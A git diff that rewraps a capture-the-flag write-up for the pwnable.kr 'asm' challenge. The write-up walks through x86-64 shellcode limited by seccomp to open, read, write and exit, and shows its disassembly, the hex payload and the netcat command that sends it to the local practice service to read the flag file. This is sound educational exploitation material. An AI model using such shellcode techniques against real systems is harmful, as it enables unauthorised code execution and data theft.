@@ -86,7 +86,9 @@ int main(int argc, char* argv[]){
 As we expected, we need to create shellcode, but we can only use open,read,write,exit api due to seccomp.
 Obviously, this is enough for read a file.
 We need to read 
->"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" file.
+"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_
+loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000
+000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" file.
 
 The file name is long, but it does not cause any problem because we can create the shellcode size up to 0x1000 which is very big.
 
@@ -174,7 +176,8 @@ We can push 8 bytes character into register and then push register in to stack.
 Instead, I used 2nd approach. I calculated the size of code section (shellcode), and used relative addressing technique to reference the file name which I manually insert at the end of shellcode.
 
 For relative address technique, read this
-https://subscription.packtpub.com/book/networking_and_servers/9781788473736/5/ch05lvl1sec36/the-relative-address-technique
+https://subscription.packtpub.com/book/networking_and_servers/
+9781788473736/5/ch05lvl1sec36/the-relative-address-technique
 
 For writing assembly program, I referenced this
 https://cs.lmu.edu/~ray/notes/nasmtutorial/
@@ -185,39 +188,76 @@ https://defuse.ca/online-x86-assembler.htm#disassembly
 
 The Shellcode!!!
 > 0:  48 c7 c0 02 00 00 00    mov    rax,0x2
+
 > 7:  48 8d 3d 33 00 00 00    lea    rdi,[rip+0x33]        # 41 <_main+0x41>
+
 > e:  49 89 e2                mov    r10,rsp
+
 > 11: 0f 05                   syscall
+
 > 13: 48 89 c7                mov    rdi,rax
+
 > 16: 48 31 c0                xor    rax,rax
+
 > 19: 48 c7 c2 00 10 00 00    mov    rdx,0x1000
+
 > 20: 4c 89 d6                mov    rsi,r10
+
 > 23: 0f 05                   syscall
+
 > 25: 48 c7 c0 01 00 00 00    mov    rax,0x1
+
 > 2c: 48 c7 c7 01 00 00 00    mov    rdi,0x1
+
 > 33: 0f 05                   syscall
+
 > 35: 48 c7 c0 3c 00 00 00    mov    rax,0x3c
+
 >  3c: 48 31 ff                xor    rdi,rdi
+
 > 3f: 0f 05                   syscall
 
+
 this is this.
-> 48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f686969
+48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D6
+0F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF
+0F052f746d702f736a2f686969
 
 the file name is
-> [hex(ord(c)) for c in "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"]
+[hex(ord(c)) for c in "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file
+_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+oooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000
+000000000o0o0o0o0o0o0ong"]
+
 
 > ['0x74', '0x68', '0x69', '0x73', '0x5f', '0x69', '0x73', '0x5f', '0x70', '0x77', '0x6e', '0x61', '0x62', '0x6c', '0x65', '0x2e', '0x6b', '0x72', '0x5f', '0x66', '0x6c', '0x61', '0x67', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x70', '0x6c', '0x65', '0x61', '0x73', '0x65', '0x5f', '0x72', '0x65', '0x61', '0x64', '0x5f', '0x74', '0x68', '0x69', '0x73', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x2e', '0x73', '0x6f', '0x72', '0x72', '0x79', '0x5f', '0x74', '0x68', '0x65', '0x5f', '0x66', '0x69', '0x6c', '0x65', '0x5f', '0x6e', '0x61', '0x6d', '0x65', '0x5f', '0x69', '0x73', '0x5f', '0x76', '0x65', '0x72', '0x79', '0x5f', '0x6c', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x6f', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x30', '0x6f', '0x6e', '0x67']
 
 This is my final shellcode,
 
-> 48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700
+> 48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F05
+48C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869
+692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c65617365
+5f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f6973
+5f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f
+6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f
+6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f
+6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f
+306f306f6e6700
 
 don't forget to insert 0x00 at the end of the file name.
 and need to add file path ./ at the beginning of the file name.
 By the way, the buffer for read and write syscall, I used RSP to reference suitable stack region.
 
 All ready, let's send the payload to get the flag!
-> python -c 'print "48C7C002000000488D3D330000004989E20F054889C74831C048C7C2001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e6700".decode("hex")' > hsj3
+> python -c 'print "48C7C002000000488D3D330000004989E20F054889C74831C048C7C2
+001000004C89D60F0548C7C00100000048C7C7010000000F0548C7C03C0000004831FF0F052f
+746d702f736a2f6869692e2f746869735f69735f70776e61626c652e6b725f666c61675f6669
+6c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c
+655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f
+6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f
+6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f30303030303030303030303030303030303030303030
+3030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030
+6f306f306f306f306f306f306f6e6700".decode("hex")' > hsj3
 
 asm@ubuntu:~$ cat /tmp/sj/hsj3 | nc 0 9026
 Welcome to shellcoding practice challenge.
